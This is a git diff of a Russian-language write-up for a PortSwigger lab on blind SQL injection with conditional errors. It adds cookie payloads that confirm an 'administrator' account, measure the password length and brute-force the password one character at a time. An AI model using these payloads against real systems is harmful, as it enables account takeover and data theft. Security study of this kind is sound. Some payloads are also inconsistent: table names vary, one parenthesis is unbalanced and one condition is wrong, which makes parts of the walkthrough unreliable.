@@ -1,4 +1,4 @@
-# Лабораторная работа: Слепая SQL-инъекция с условными ошибками
+<img width="1882" height="826" alt="image" src="https://github.com/user-attachments/assets/2115b2de-14d5-46bf-92e4-ee4f0c9be68a" /># Лабораторная работа: Слепая SQL-инъекция с условными ошибками
 
 В этой лабораторной работе обнаружена уязвимость слепой SQL-инъекции. Приложение использует отслеживающий `cookie`-файл для аналитики и выполняет SQL-запрос, содержащий значение отправленного `cookie`-файла.
 
@@ -77,3 +77,29 @@ Cookie: TrackingId=k2xQHAMjyOoJ8Iz4' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0
 ```
 
 ![PortSwigger](../Drawing/Drawing_25.png)
+
+Определяем существует ли именно пользователь `administrator`:
+
+```sql
+Cookie: TrackingId=k2xQHAMjyOoJ8Iz4' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM user WHERE username='administrator') ||'
+```
+Результат - ошибка, следовательно пользователь-администратор существует!
+
+Далее пытаемся определить длину пароля:
+
+```sql
+Cookie: TrackingId=k2xQHAMjyOoJ8Iz4' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM user WHERE username='administrator' AND LENGTH(password)>1 ||'
+```
+![PortSwigger](../Drawing/Drawing_26.png)
+
+Длина пароля равна 20 символам.
+
+Начинаем брутфорс, как в предыдущей лабораторной, запрос будет таким:
+
+```sql
+Cookie: TrackingId=k2xQHAMjyOoJ8Iz4' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a') ||'
+```
+
+Получается что-то похожее на это:
+
+![PortSwigger](../Drawing/Drawing_27.png)
